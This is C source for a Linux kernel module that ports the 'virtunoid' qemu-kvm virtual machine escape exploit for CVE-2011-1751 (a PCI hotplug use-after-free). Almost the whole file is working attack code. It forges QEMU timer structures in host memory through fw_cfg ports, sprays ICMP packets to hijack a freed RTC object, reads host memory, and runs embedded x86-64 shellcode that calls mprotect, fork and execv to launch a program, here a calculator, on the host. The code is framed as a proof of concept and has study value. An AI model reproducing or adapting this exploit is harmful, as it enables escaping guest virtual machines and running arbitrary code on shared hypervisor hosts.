/* Kernel module version of virtunoid
* -----------------------------------
* How to build:
* $ make
* Note: you need to have source code for linux-3.0 and busybox-1.17.1.
* -----------------------------------
* How to run:
* $ kvm -kernel bzImage -initrd initrd.gz
* Note: bzImage is build from linux-3.0.
* -----------------------------------
* Expectation:
* A calculator pops out.
*/

#include <linux/module.h>
#include <linux/init.h>
#include <linux/in.h>
#include <net/sock.h>
#include <linux/skbuff.h>
#include <linux/delay.h>
#include <linux/inet.h>
#include <linux/icmp.h>

#include <linux/gfp.h> //__get_free_pages
#include <linux/syscalls.h>
#include <asm/io.h>		// for virt_to_phys()

#include "virtunoid-config.h"
#define QEMU_GATEWAY  0x0202000a //"10.0.2.2"
//#define QEMU_GATEWAY  0x017aa8c0//"192.168.122.1"

#include <stdarg.h>
#include <linux/rtc.h>
#include <linux/delay.h>
#include <linux/errno.h>

typedef uint64_t hva_t;
typedef uint64_t gpa_t;
typedef uint64_t gfn_t;
typedef void    *gva_t;

#define PAGE_SHIFT  12
#define PAGE_SHIFT_SIZE   (1 << PAGE_SHIFT)
#define PFN_PRESENT (1ull << 63)
#define PFN_SWAPPED (1ull << 62)
#define PFN_PFN     ((1ull << 55) - 1)

#define BIOS_CFG_IOPORT 0x510
#define BIOS_CFG_DATAPORT (BIOS_CFG_IOPORT + 1)
#define FW_CFG_WRITE_CHANNEL    0x4000
#define FW_CFG_ARCH_LOCAL       0x8000

#define FW_CFG_E820_TABLE (FW_CFG_ARCH_LOCAL + 3)
#define FW_CFG_HPET (FW_CFG_ARCH_LOCAL + 4)

#define PORT 0xae08

/* function pointer address in System.map */
#define PRINTK 0xffffffff8130acce // printk
#define SNPRINTF 0xffffffff8116a3f0 // snprintf

/* function prototype */
int p_printk(const char *fmt, ...);
int p_snprintf(char *s, size_t n, const char *fmt, ...);

//////////////////////////////////
#include <asm/mman.h>

int mprotect(const void *addr, size_t len, int prot);
pid_t fork(void);
int execv(const char *path, char *const argv[]);

#define MSGSIZE 128

int assert(int val){
    if(val != 1){
        char assert_msg[] = "Assert fail.\n";
        ((typeof(p_printk)*)PRINTK)(assert_msg);
        return -1;
    }
    return 0;
}

/* the file operation code is from stackoverflow */
#include <linux/fs.h>
#include <asm/segment.h>
#include <asm/uaccess.h>
#include <linux/buffer_head.h>

/* open file */
struct file* file_open(const char* path, int flags, int rights) {
    struct file* filp = NULL;
    mm_segment_t oldfs;
    int err = 0;

    oldfs = get_fs();
    set_fs(get_ds());
    filp = filp_open(path, flags, rights);
    set_fs(oldfs);
    if(IS_ERR(filp)) {
        err = PTR_ERR(filp);
        return NULL;
    }
    return filp;
}

/* Close a file (similar to close) */
void file_close(struct file* file) {
    filp_close(file, NULL);
}

/* Reading data from a file (similar to pread) */
int file_read(struct file* file, unsigned long long offset, unsigned char* data, unsigned int size) {
    mm_segment_t oldfs;
    int ret;

    oldfs = get_fs();
    set_fs(get_ds());

    ret = vfs_read(file, data, size, &offset);
    if (offset != 0){
        char print_msg[] = "Offset is not 0.\n";
        ((typeof(p_printk)*)PRINTK)(print_msg);
    }
    set_fs(oldfs);
    return ret;
}

//////////////////////////////////

/* Taken from iputils ping.c */
u_short
in_cksum(const u_short *addr, register int len, u_short csum)
{
    register int nleft = len;
    const u_short *w = addr;
    register u_short answer;
    register int sum = csum;

    /*
     *  Our algorithm is simple, using a 32 bit accumulator (sum),
     *  we add sequential 16 bit words to it, and at the end, fold
     *  back all the carry bits from the top 16 bits into the lower
     *  16 bits.
     */
    while (nleft > 1)  {
        sum += *w++;
        nleft -= 2;
    }

    /* mop up an odd byte, if necessary */
    if (nleft == 1)
        sum += htons(*(u_char *)w << 8);

    /*
     * add back carry outs from top 16 bits to low 16 bits
     */
    sum = (sum >> 16) + (sum & 0xffff);    /* add hi 16 to low 16 */
    sum += (sum >> 16);            /* add carry */
    answer = ~sum;                /* truncate to 16 bits */
    return (answer);
}

//end portbunny

/* virtunoid.c: qemu-kvm escape exploit, 0.13.51 <= qemu-kvm <= 0.14.50
 *  by Nelson Elhage <nelhage@nelhage.com>
 *
 * Exploits CVE-2011-1751, insufficient checks in PCI hotplug.
 *
 * The underlying bug exists since qemu-kvm 0.11.51, but this exploit
 * uses features introduced in qemu-kvm 0.13.51. We choose to do this
 * for simplicity, and in order to limit the scope of this exploit,
 * since this is intended as a proof-of-concept.
 *
 * I presented on this bug at BlackHat/DEFCON 2011. Slides are
 * available at <http://nelhage.com/talks/kvm-defcon-2011.pdf>, and
 * include a detailed discussion of this exploit.
 */


/***********************************************************************/

struct QEMUClock {
    uint32_t type;
    uint32_t enabled;
};

struct QEMUTimer {
    hva_t clock;
    int64_t expire_time;
#ifdef HAVE_TIMER_SCALE
    int scale;
#endif
    hva_t cb;           /* void (*)(void*) */
    hva_t opaque;       /* void* */
    hva_t next;         /* struct QEMUTimer * */
};

struct IORangeOps {
    /*    void (*read)(IORange *iorange, uint64_t offset, unsigned width,
              uint64_t *data);
          void (*write)(IORange *iorange, uint64_t offset, unsigned width,
              uint64_t data);
    */
    hva_t read;
    hva_t write;
};

struct IORange {
    hva_t ops;
    uint64_t base;
    uint64_t len;
};

/*********************************************************************/

/*
 * These structures describe the writable fw_cfg regions in the
 * host. We keep a shadow copy of those regions, and
 * commit_targets()/read_targets() sync between our shadow regions and
 * the real buffers on the host.
 *
 * gva_to_hva knows about these shadow regions and uses the fw_cfg
 * addresses when possible.
 *
 * host_alloc implements a simple first-fit allocator into the shadow
 * regions.
 *
 * snapshot_targets/rollback_targets implement a checkpoint/restore
 * mechanism on the allocator state. This is used to first allocate a
 * bunch of structures that will be needed for every timer chain, then
 * take a checkpoint before executing individual timer chains, after
 * which the state can be rolled back.
 *
 */
struct target_region {
    hva_t hva;
    uint8_t *data;
    size_t len;
    uint16_t entry;
    uint8_t *alloc;
    uint8_t *snapshot;
};



void commit_targets(struct target_region targets[], uint64_t *fake_rtc) {
    struct target_region *t = targets;
    fake_rtc[OFFSET_RTCSTATE_NEXT_SECOND_TIME/sizeof(*fake_rtc)] = 10;
    for (; t->data; t++) {
        int i;
        outw(FW_CFG_WRITE_CHANNEL | t->entry, BIOS_CFG_IOPORT);
        for (i = 0; i < t->len - 1; i++)
            outb(t->data[i], BIOS_CFG_DATAPORT);
#ifdef DEBUG_COMMIT
        outw(FW_CFG_WRITE_CHANNEL | t->entry, BIOS_CFG_IOPORT);
        for (i = 0; i < t->len - 1; i++)
            assert(inb(BIOS_CFG_DATAPORT) == t->data[i]);
#endif
    }
}

void refresh_targets(struct target_region targets[]) {
    struct target_region *t = targets;
    for (; t->data; t++) {
        int i;
        outw(FW_CFG_WRITE_CHANNEL | t->entry, BIOS_CFG_IOPORT);
        for (i = 0; i < t->len - 1; i++)
            t->data[i] = inb(BIOS_CFG_DATAPORT);
    }
}

void snapshot_targets(struct target_region targets[]) {
    struct target_region *t = targets;
    for (; t->data; t++)
        t->snapshot = t->alloc;
}

void rollback_targets(struct target_region targets[]) {
    struct target_region *t = targets;
    for (; t->data; t++)
        t->alloc = t->snapshot;
}

void *host_alloc(struct target_region targets[], size_t size) {
    struct target_region *t = targets;
    for (; t->data; t++) {
        size_t free;
        if (!t->alloc) {
            t->alloc = t->data;
        }
        free = t->data + t->len - 1 - t->alloc;
        if (free >= size) {
            void *p = t->alloc;
            t->alloc += size;
            return p;
        }
    }
    assert(0);
    return NULL;
}

void* obj_alloc(struct target_region targets[], size_t start, size_t last) {
    size_t need = last - start;
    void *ptr = host_alloc(targets, need);
    return ptr - start;
}

/*********************************************************************/

uint32_t addr_page_offset(unsigned long addr) {
    return addr & ((1 << PAGE_SHIFT) - 1);
}

gpa_t gva_to_gpa(gva_t addr) {
    unsigned long paddr = virt_to_phys(addr);
    return paddr;
}

hva_t gpa_to_hva(gpa_t gpa, hva_t highmem_hva_base) {
    assert (gpa > 0x00100000);
    return gpa  + highmem_hva_base;
}

hva_t gva_to_hva(struct target_region targets[], gva_t addr, hva_t highmem_hva_base) {
    struct target_region *r;
    for (r = targets; r->data; r++)
        if (addr > (gva_t)r->data - PAGE_SHIFT_SIZE &&
            addr < (gva_t)r->data + r->len) {
            return r->hva + (addr - (gva_t)r->data);
        }

    return gpa_to_hva(gva_to_gpa(addr), highmem_hva_base);
}

/*
 * This structure is used to communicate data between the host and
 * guest post-exploitation.
 */

struct shared_state {
    char prog[32];
    hva_t shellcode;
    int done;
};

/*
 * Construct and return a single fake timer, with the specified
 * fields.
 */
struct QEMUTimer *fake_timer(struct target_region targets[], hva_t cb, hva_t opaque, struct QEMUTimer *next, hva_t highmem_hva_base) {
    struct QEMUTimer *timer = host_alloc(targets, sizeof *timer);
    memset(timer, 0, sizeof *timer);
    timer->clock = CLOCK_HVA;
#ifdef HAVE_TIMER_SCALE
    timer->scale = 1;
#endif
    timer->cb = cb;
    timer->opaque = opaque;
    timer->next = next ? gva_to_hva(targets, next, highmem_hva_base) : 0;
    return timer;
}

/*
 * Construct a timer chain that performs an mprotect() and then calls
 * into shellcode.
 */
struct QEMUTimer *construct_payload(struct target_region targets[], struct shared_state share, hva_t highmem_hva_base) {
    char leave_msg[] = "leaving construct_payload\n";

    struct IORange *ioport;
    struct IORangeOps *ops;
    struct QEMUTimer *timer;
    unsigned  long int mask = ~(PAGE_SIZE-1ull);
    //int i;
    int len = 0x69;//0x7c;
    uint8_t* ptr8;
    uint32_t* ptr32;

    char sc[] = "\x55\
\x48\x8d\x2d\xf8\xff\xff\xff\
\x31\xf6\x83\xc6\x02\
\x31\xff\x83\xc7\x70\
\x8b\x45\x67\
\xff\xd0\
\x48\x83\xec\x20\
\x48\x8d\x45\x4d\
\x48\x89\x44\x24\x10\
\x31\xc0\x48\x89\x44\x24\x18\
\x8b\x45\x6b\
\xff\xd0\
\x85\xc0\
\x75\x15\
\x48\x8d\x54\x24\x10\
\x48\x8b\x02\
\x48\x89\xd6\
\x48\x89\xc7\
\x8b\x45\x6f\
\xff\xd0\
\x48\x83\xc4\x20\
\x5d\
\xc3/usr/bin/gnome-calculator";
    ((typeof(p_printk)*)PRINTK)(sc);
    len = strlen(sc)+1;

    ops = kmalloc(sizeof *ops,GFP_ATOMIC);

    ops->read = MPROTECT;
    ops->write = 0;

    ioport = (struct IORange*) kmalloc(3*PAGE_SIZE,GFP_ATOMIC);

    mask = (long unsigned int)ioport;

    mask = mask >> 12;
    mask = mask << 12;

    mask += PAGE_SIZE;

    ioport = (struct IORange *)mask;

    ioport->ops = gva_to_hva(targets, ops, highmem_hva_base);
    ioport->base = -(2*PAGE_SIZE);

    share.shellcode = gva_to_hva(targets, ioport, highmem_hva_base);

    memcpy(ioport + 1, sc, len);
    ptr8 = (uint8_t*)(ioport+1);
    ptr8 += len;
    ptr32 = (uint32_t*)ptr8;
    *ptr32++ = ISA_UNASSIGN_IOPORT;
    *ptr32++ = FORK;
    *ptr32++ = EXECV;

    timer = NULL;
    timer = fake_timer(targets, gva_to_hva(targets, ioport+1, highmem_hva_base), gva_to_hva(targets, (void*)&share, highmem_hva_base), timer, highmem_hva_base);//joke
    timer = fake_timer(targets, IOPORT_READL_THUNK, gva_to_hva(targets, ioport, highmem_hva_base), timer, highmem_hva_base);
    timer = fake_timer(targets, CPU_OUTL, 0, timer, highmem_hva_base);//0x5e155e

    ((typeof(p_printk)*)PRINTK)(leave_msg);
    return timer;
}

/*
 * Construct a timer chain that reads a single 4-byte value from the
 * host, and writes a pointer to the result into *out.
 */
struct QEMUTimer *construct_read(struct target_region targets[], struct QEMUTimer *timer, hva_t hva, uint32_t **out, hva_t highmem_hva_base) {
    uint32_t *ptr = host_alloc(targets, sizeof *ptr);
    *out = ptr;

    timer = fake_timer(targets, BDRV_RW_EM_CB, gva_to_hva(targets, ptr, highmem_hva_base), timer, highmem_hva_base);
    timer = fake_timer(targets, KVM_ARCH_DO_IOPERM, hva - 8, timer, highmem_hva_base);
    timer = fake_timer(targets, QEMU_GET_RAM_PTR, 1<<20, timer, highmem_hva_base);

    return timer;
}


/*
 * Read and return 8 bytes from the host.
 *
 * The timer 'head' is currently queued on the host's timer queues,
 * and after return, 'chain' will be queued.
 */
uint64_t read_host8(struct target_region targets[], struct QEMUTimer *head, struct QEMUTimer *chain, hva_t addr, uint64_t *fake_rtc, hva_t highmem_hva_base) {
    uint64_t val = 0;
    uint32_t *low, *hi;

    struct QEMUTimer *timer = chain;
    timer->next = 0;
    timer = construct_read(targets, timer, addr, &low, highmem_hva_base);
    timer = construct_read(targets, timer, addr + 4, &hi, highmem_hva_base);
    head->next = gva_to_hva(targets, timer, highmem_hva_base);
    head->expire_time = 0;
    *hi = (uint32_t)-1;
    commit_targets(targets, fake_rtc);
    while (*hi == (uint32_t)-1) {
        mdelay(1000);
        refresh_targets(targets);
    }
    val = ((uint64_t)*hi << 32) | (uint64_t)*low;
    rollback_targets(targets);
    return val;
}

/*
 * Massage the RTC into a convenient state for the exploit. Wait for a
 * "UIE" interrupt, indicating the end of an update cycle, and then
 * set register 10 to disable normal updating of the RTC. This has the
 * effect of cutting rtc_update_second2 out of the loop, and just
 * making rtc_update_second get called once a second.
 *
 * This is relevant because free() clobbers ->second_timer2, so if we
 * don't make this change, we risk a SEGV if second_timer2 gets
 * re-scheduled before we can exploit the bug.
 *
 * See qemu-kvm:hw/mc146818rtc.c for the relevant code.
 */
void wait_rtc(void) {
    struct file *fd;
    struct rtc_device *rtc;

    int val;
    char dev_rtc[] = "/dev/rtc";
    char die_msg[] = "error: wait_rtc.\n";
    if ((fd = file_open(dev_rtc, O_RDONLY, 0)) == NULL){
        ((typeof(p_printk)*)PRINTK)(die_msg);
    }
    rtc = fd->private_data;
    if (rtc_update_irq_enable(rtc, 1) < 0){
        ((typeof(p_printk)*)PRINTK)(die_msg);
    }
    if (file_read(fd, 0, (unsigned char *)&val, sizeof val) != sizeof(val)){
        ((typeof(p_printk)*)PRINTK)(die_msg);
    }
    if (rtc_update_irq_enable(rtc, 0) < 0){
        ((typeof(p_printk)*)PRINTK)(die_msg);
    }
    file_close(fd);
    outb(10,   0x70);
    outb(0xF0, 0x71);
}

/* use to set the prog in share */
struct shared_state set_share(void){
    char g_calc[] = "/usr/bin/gnome-calculator";
    struct shared_state share;
    snprintf(share.prog, sizeof(share.prog), g_calc);
    return share;
}

struct debug_msg {
    char enter_msg[32];
    char socket_msg[32];
    char wait_msg[32];
    char hotplug_msg[32];
    char done_msg[32];
    char exit_msg[32];
};

struct debug_msg set_msgs(void){
/*
    char full_msg[] = "0123456789";
    struct debug_msg msgs;
    snprintf(msgs.enter_msg, sizeof(msgs.enter_msg), full_msg);
    snprintf(msgs.socket_msg, sizeof(msgs.socket_msg), full_msg);
    snprintf(msgs.wait_msg, sizeof(msgs.wait_msg), full_msg);
    snprintf(msgs.hotplug_msg, sizeof(msgs.hotplug_msg), full_msg);
    snprintf(msgs.done_msg, sizeof(msgs.done_msg), full_msg);
    snprintf(msgs.exit_msg, sizeof(msgs.exit_msg), full_msg);
*/
    char enter_msg[] = "ENTER MODULE.\n";
    char socket_msg[] = "Constructing socket...\n";
    char wait_msg[] = "Waiting for RTC interrupt...\n";
    char hotplug_msg[] = "Done hotplug...\n";
    char done_msg[] = "Done!\n";
    char exit_msg[] = "EXIT MODULE.\n";
    struct debug_msg msgs;
    snprintf(msgs.enter_msg, sizeof(msgs.enter_msg), enter_msg);
    snprintf(msgs.socket_msg, sizeof(msgs.socket_msg), socket_msg);
    snprintf(msgs.wait_msg, sizeof(msgs.wait_msg), wait_msg);
    snprintf(msgs.hotplug_msg, sizeof(msgs.hotplug_msg), hotplug_msg);
    snprintf(msgs.done_msg, sizeof(msgs.done_msg), done_msg);
    snprintf(msgs.exit_msg, sizeof(msgs.exit_msg), exit_msg);

    return msgs;
}

/* the entrance of the code */
static int __init server_init( void ){
    /* move global varables here */
    mm_segment_t oldfs;

    uint64_t *fake_rtc;

    struct {
        struct cmsghdr cm;
        struct in_pktinfo ipi;
    }cmsg = { {sizeof(struct cmsghdr) + sizeof(struct in_pktinfo), SOL_IP, IP_PKTINFO}, {0, }};

    uint8_t buf[1024]; // it was [8637] [SIZEOF_E820_TABLE+2*PAGE_SHIFT_SIZE+SIZEOF_HPET_CFG];

    struct target_region targets[] = {
        { E820_TABLE, buf, SIZEOF_E820_TABLE, FW_CFG_E820_TABLE },
        { HPET_CFG, buf + SIZEOF_E820_TABLE + PAGE_SHIFT_SIZE, SIZEOF_HPET_CFG, FW_CFG_HPET },
        { 0, 0, 0, 0}
    };

    struct shared_state share = set_share();
    struct debug_msg msgs = set_msgs();

    int i;
    unsigned char packet[SIZEOF_RTCSTATE - PACKET_OFFSET];

    int len = sizeof(packet);
    struct icmphdr *icmp = (struct icmphdr*)packet;
    struct sockaddr_in dest = {};

    struct QEMUTimer *timer, *timer2;
    hva_t timer_hva;
    hva_t ram_block;

    struct iovec iov;
    struct socket *sock;

    int ret = sock_create(AF_INET, SOCK_RAW, IPPROTO_ICMP, &sock);
    struct msghdr msg = { &dest, sizeof(dest),
              &iov, 1, &cmsg, 0, 0 };

    hva_t highmem_hva_base = 0;

    /* check if socket-creation was successful */
    if(ret < 0){
        return -1;
    }

    ((typeof(p_printk)*)PRINTK)(msgs.enter_msg);

    oldfs = get_fs();
    set_fs(get_ds());

    memset(buf, 0, sizeof buf);
    memset(packet, 0x33, sizeof(packet));

    assert(OFFSET_RTCSTATE_NEXT_SECOND_TIME <
           OFFSET_RTCSTATE_SECOND_TIMER);
    fake_rtc = obj_alloc(targets, OFFSET_RTCSTATE_NEXT_SECOND_TIME,
                    SIZEOF_RTCSTATE);

    timer = fake_timer(targets, RTC_UPDATE_SECOND, gva_to_hva(targets, fake_rtc, highmem_hva_base), 0, highmem_hva_base);
    timer2 = fake_timer(targets, RTC_UPDATE_SECOND, gva_to_hva(targets, fake_rtc, highmem_hva_base), 0, highmem_hva_base);
    timer_hva = gva_to_hva(targets, timer, highmem_hva_base);

    // memset(rtc, 0x77, SIZEOF_RTCSTATE);
    fake_rtc[OFFSET_RTCSTATE_SECOND_TIMER/sizeof(*fake_rtc)] = timer_hva;
    fake_rtc[OFFSET_RTCSTATE_NEXT_SECOND_TIME/sizeof(*fake_rtc)] = 10;

#define RTC(type, offset) (type*)(packet + (offset) - PACKET_OFFSET)

    *RTC(hva_t, OFFSET_RTCSTATE_SECOND_TIMER) = timer_hva;
    *RTC(uint64_t, OFFSET_RTCSTATE_NEXT_SECOND_TIME) = 10;

    snapshot_targets(targets);

    commit_targets(targets, fake_rtc);

    ((typeof(p_printk)*)PRINTK)(msgs.socket_msg);

    /* fillout sockaddr_in-structure whereto */
    memset(&dest, 0, sizeof(dest));
    dest.sin_family = AF_INET;
    dest.sin_addr.s_addr = QEMU_GATEWAY;

    icmp->type = ICMP_ECHO;
    icmp->code = 0;
    icmp->un.echo.id = 0xabcd;
    icmp->un.echo.sequence = htons(1);
    icmp->checksum = 0;

    iov.iov_base = packet;
    iov.iov_len = sizeof(packet);

    /* calculate icmp-checksum */
    icmp->checksum = in_cksum((void*)&packet, len, 0);

    ((typeof(p_printk)*)PRINTK)(msgs.wait_msg);

    wait_rtc();

    outl(2, PORT);

    ((typeof(p_printk)*)PRINTK)(msgs.hotplug_msg);

    i = 0;
    while (timer->expire_time == 0) {
        sock_sendmsg(sock, &msg, len);
        if (++i % 1000 == 0){
            refresh_targets(targets);
        }
    }
    sock_release(sock);
    sock = NULL;

    ram_block = read_host8(targets, timer, timer2, ADDR_RAMLIST_FIRST, fake_rtc, highmem_hva_base);
    highmem_hva_base = read_host8(targets, timer, timer2, ram_block, fake_rtc, highmem_hva_base);
    timer->next   = gva_to_hva(targets, construct_payload(targets, share, highmem_hva_base), highmem_hva_base);
    timer->expire_time = 0;

    set_fs(oldfs);
    commit_targets(targets, fake_rtc);

    while (!share.done)
	mdelay(1000);

    ((typeof(p_printk)*)PRINTK)(msgs.done_msg);

    return 0;
}

static void __exit server_exit( void )
{
    //((typeof(p_printk)*)PRINTK)(msgs.exit_msg);
}

module_init(server_init);
module_exit(server_exit);
MODULE_LICENSE("GPL");
